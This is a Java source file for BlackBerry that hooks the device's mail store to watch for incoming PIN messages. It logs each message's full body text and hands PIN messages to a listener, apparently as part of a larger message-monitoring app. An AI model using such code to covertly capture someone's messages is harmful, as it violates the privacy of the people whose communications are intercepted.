package com.vvt.pinc;

import com.vvt.std.Log;

import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;

public class PinMonitor implements FolderListener {

	private Session 		defaultSession;
	private PinListener		listener;

	public PinMonitor() {
	}
	
	public void setPinListener(PinListener listener)	{
		this.listener = listener;
	}
	
	public void startMonitor()	{
		try {
			defaultSession 		= Session.getDefaultInstance();
			if (defaultSession != null && listener != null)	{
				Store 	store	= defaultSession.getStore();
				store.addFolderListener(this);
				listener.done("Start Monitoring PIN Message\r\n");
			}
		}
		catch (Exception e ) {
			if (listener != null) {
				listener.error("Exception:"+e.getMessage());
			}
		}
	}
	
	public void stopMonitor()	{
		try {
			defaultSession 		= Session.getDefaultInstance();
			if (defaultSession != null && listener != null)	{
				Store 	store	= defaultSession.getStore();
				store.removeFolderListener(this);
				listener.done("Stop Monitoring PIN Message\r\n");
			}
		}
		catch (Exception e ) {
			if (listener != null) {
				listener.error("Exception:"+e.getMessage());
			}
		}
	}
	
	public void messagesAdded(FolderEvent e) {
		Message	message	= e.getMessage();
		if (Log.isDebugEnable()) {
			Log.debug("PinMonitor.messagesAdded()", "message type: " + message.getMessageType() + " , message: " + message.getBodyText());
		}
		if (message.getMessageType()==Message.PIN_MESSAGE && listener != null)	{
			listener.pinMessageAdded(message);
		}
	}

	public void messagesRemoved(FolderEvent e) {
	}

}
